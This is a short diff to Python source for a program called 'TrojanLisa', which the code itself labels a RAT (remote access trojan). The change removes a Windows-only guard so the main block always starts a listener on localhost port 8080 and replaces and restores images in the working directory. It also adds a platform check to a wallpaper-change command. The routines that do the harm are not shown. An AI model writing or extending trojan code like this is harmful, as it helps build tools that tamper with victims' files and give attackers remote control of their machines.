@@ -45,6 +45,8 @@ class TrojanLisa:
             print("Restoring original images...")
             self.restore_images(os.curdir)
         elif command == "3":
+            if sys.platform != "win32":
+                return False
             print("Changing background...")
             self.change_wallpaper()
         elif command == "4":
@@ -71,9 +73,6 @@ class TrojanLisa:
             
 if __name__=="__main__":
     trojan_lisa = TrojanLisa()
-    if sys.platform == "win32":
-        trojan_lisa.host('127.0.0.1', 8080)
-        trojan_lisa.replace_images(".")
-        trojan_lisa.restore_images(".")
-    else:
-        print("RAT can only be run on Windows.")
+    trojan_lisa.host('127.0.0.1', 8080)
+    trojan_lisa.replace_images(".")
+    trojan_lisa.restore_images(".")
